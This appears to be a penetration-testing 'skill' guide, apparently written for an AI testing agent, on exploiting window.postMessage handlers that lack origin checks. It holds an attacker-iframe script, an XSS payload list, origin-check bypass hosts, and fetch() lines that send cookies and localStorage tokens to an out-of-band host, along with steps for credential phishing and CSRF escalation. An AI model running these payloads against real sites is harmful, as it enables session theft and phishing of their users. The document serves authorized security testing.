# postMessage Cross-Origin Communication — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Client-Side | **Impact:** High | **Prerequisite:** Browser automation (Playwright MCP) available, target pages mapped in Phase 2, suspicious iframes/windows/widgers identified

---

## Mental Model

`window.postMessage` is the sanctioned way for a page, an embedded iframe, or a popup to talk across origins. It's a *capability* with no built-in trust — the receiving side must verify *who* sent the message and the sending side must state *where* it's sending. When either side skips that, an attacker's page can impersonate the trusted partner.

**The core assumption you're violating:** "Only our own code calls postMessage, so the handler doesn't need to check origin." Two concrete failures:

1. **Receiving side — missing `event.origin` check.** The listener `window.addEventListener('message', handler)` accepts messages from ANY origin. Attacker embeds the target in an iframe, calls `targetWindow.postMessage(...)` from attacker.com, and the target's handler acts on attacker-controlled `event.data`.
2. **Sending side — missing `targetOrigin`.** The app calls `otherWindow.postMessage(data)` with `"*"` (or a wrong origin) — your secrets are delivered to any window that happens to be there, including attacker frames.
3. **Unsafe use of `event.data`.** Even with a correct origin check, if `data` is fed to `innerHTML`, `eval`, `document.write`, `location`, `src`, `srcdoc`, or `new Function`, the attacker controls the sink → DOM XSS inside the target's origin.

**The exploit is always "attacker page + postMessage + victim handler → attacker-controlled action in the victim's origin."** Your job is to find a handler (or a sender) with a broken trust boundary, then drive it from an attacker iframe/popup.

---

## Phase 1: OOB-First Detection (MANDATORY)

Client-side bugs don't have server callbacks, but OOB makes the *exfiltration* proof concrete: once you can execute in the target origin, ship the victim's cookies/localStorage to OOB.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.1 OOB as the exfil sink
Load the target page in Playwright MCP, run this from an attacker-controlled iframe context (see 2.2), and check OOB for the cookie callback:

```js
// In attacker iframe after driving a handler: exfil proof
fetch("http://OOB_URL/steal?d=" + btoa(document.cookie))
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 30
```

Callback carrying cookie data → DOM XSS via postMessage confirmed with OOB evidence. Skip to Phase 4.

---

## Phase 2: Confirmation

### 2.1 Locate postMessage Usage (source audit)

Use Playwright `browser_evaluate` on the target page to inventory handlers and senders:

```js
// Find all message handlers
window._h = [];
const orig = window.addEventListener;
window.addEventListener = function (t, fn, o) {
  if (t === 'message') { _h.push(fn.toString().slice(0, 400)); }
  return orig.call(this, t, fn, o);
};
// Then scan bundle/source for postMessage calls & handlers
```

Grep the page source and the Phase 2 spider `understanding/` bundle output for:
- `addEventListener('message'` / `addEventListener("message"`
- `onmessage =`
- `postMessage(`
- Known libraries that route through postMessage (Postmate, Comlink, iframe-resizer, ads, chat, auth iframes)

### 2.2 Classify the Trust Boundary (the verdict lives here)

For **every** handler found, answer three questions:

1. **Is `event.origin` checked?**
```js
// VULNERABLE — no check
window.addEventListener('message', function (e) { ... });
// VULNERABLE — naive suffix/prefix check (attacker can register attacker.target.com)
if (e.origin.indexOf('target.com') !== -1) { ... }
// SAFE — exact match
if (e.origin === 'https://target.com') { ... }
```

2. **Is `e.data` used in a dangerous sink?** `innerHTML`, `insertAdjacentHTML`, `document.write`, `outerHTML`, `eval`, `setTimeout(str)`, `new Function`, `.src =`, `location =`, `srcdoc =`, `document.location`, jQuery `.html()`/`.append()`.

3. **Who is the intended partner?** Map expected origins for each handler.

### 2.3 Craft and Fire the Attacker Message (Playwright)

Build an attacker page and drive the target:

```js
// attacker_page.html (served from your controlled origin)
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/page-with-handler';
document.body.appendChild(iframe);
iframe.onload = () => {
  const t = iframe.contentWindow;
  // no targetOrigin check on our side is fine; the bug is on their side
  t.postMessage({ action: 'setHTML', html: '<img src=x onerror=alert(document.domain)>' }, '*');
  // also try plain strings:  t.postMessage('<img src=x onerror=...>', '*');
};
```

Load the attacker page in Playwright MCP, then:
- Check for `alert(document.domain)` dialog → XSS in target origin confirmed
- Or inspect the target iframe's DOM via `browser_evaluate` for injected elements

### 2.4 Payload Battery (if the first shape fails)

Try these `e.data` shapes — handlers expect different structures:
```js
t.postMessage('<svg onload=alert(document.domain)>', '*');
t.postMessage({ message: '<img src=x onerror=alert(1)>' }, '*');
t.postMessage(JSON.stringify({ type: 'render', data: '<script>...</script>' }), '*');
t.postMessage({ url: 'https://attacker.com/evt' }, '*');
t.postMessage({ fn: 'alert(1)' }, '*');
```

### 2.5 Sender-side Leak Test (missing targetOrigin)

If the target *sends* with `postMessage(data, '*')`:
1. Load the target page, plus an attacker iframe on the same page (any origin)
2. Check whether the target's outbound `postMessage` reaches the attacker frame with sensitive data
3. Confirm by logging `window.addEventListener('message', ...)` in the attacker frame

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare postMessage negative without:**

1. Finding **all** message handlers (bundle audit + runtime hooking) — hidden handlers in third-party widgets are the classic miss
2. Classifying each: origin check exact vs naive vs none
3. Testing each **safe-looking** handler with the *naive-check bypass* (e.g., `attacker.target.com`, `target.com.attacker.com`, `target.com:443` — if the check is `startsWith`/`includes`, subdomains bypass it)
4. Checking `e.source` too — some handlers check origin but not `e.source` (a legit origin iframe could be repurposed via open redirect / takeover)
5. Testing sinks even with a correct origin check (safe origin + unsafe sink = still vulnerable)
6. Testing the sender side (`targetOrigin: '*'` leakage)
7. Confirming with a real browser session (Playwright) that no alert/DOM change/network exfil occurs

If every handler has an exact origin check AND safe sinks AND senders use strict targetOrigin → NEGATIVE.

---

## Phase 4: Exploitation

### 4.1 DOM XSS in Target Origin (primary)
Confirmed handler + sink → `alert(document.domain)` proof, then escalate to real impact:
- Steal `document.cookie` (if httpOnly is absent) or `localStorage` tokens
- Read/modify page content → phishing within the trusted origin
- CSRF-instrument: fire authenticated state-changing requests from the target origin

### 4.2 Exfil Proof
```js
// in the target origin (delivered via the vulnerable handler)
fetch('http://OOB_URL/exfil?c=' + encodeURIComponent(document.cookie || localStorage.getItem('token')))
```
Poll OOB → evidence of actual data leaving the origin.

### 4.3 Chained Impact
- Overlay a fake login form (if the handler renders attacker HTML) → credential phishing on the real origin
- Repost to other windows the app trusts (token replay through the messenger)
- If the handler controls widget/chat/iframes, pivot to stored-content injection other users see

**Stop condition:** First demonstrated XSS/data-exfil in the target origin. Document with OOB evidence, then stop.

---

## What You DO
- Audit ALL handlers, including third-party/chat/widget code — hidden handlers are the usual finding
- Classify the trust boundary (origin check + sink) before firing payloads
- Fire messages from a real attacker-origin iframe in Playwright, not a same-origin console
- Test naive origin checks with subdomain/parsing bypasses
- Prove impact with OOB cookie/token exfiltration
- Test sender-side `targetOrigin: '*'` leakage as a separate finding

## What You DO NOT Do
- Judge from source alone — some frameworks validate origin inside a callback wrapper
- Assume `e.origin` presence means security — check *what* it's compared against and how
- Use a same-origin console (`browser_evaluate` in the target context) to "prove" the XSS — the attack must come from a *different* origin
- Stop at `alert()` — report the real impact (token theft, phishing, CSRF-instrument)
- Ignore sender-side leaks — missing targetOrigin on sensitive data is its own bug

---

## Cross-Skill Links
- [[xss]] — DOM XSS via postMessage is the payload/sink layer
- [[browser-sessions]] — Playwright MCP drives the attacker-frame / target-iframe proof
- [[oauth]] — OAuth/callback iframes are a common postMessage carrier
- [[csrf]] — Once in the target origin, instrument state-changing calls
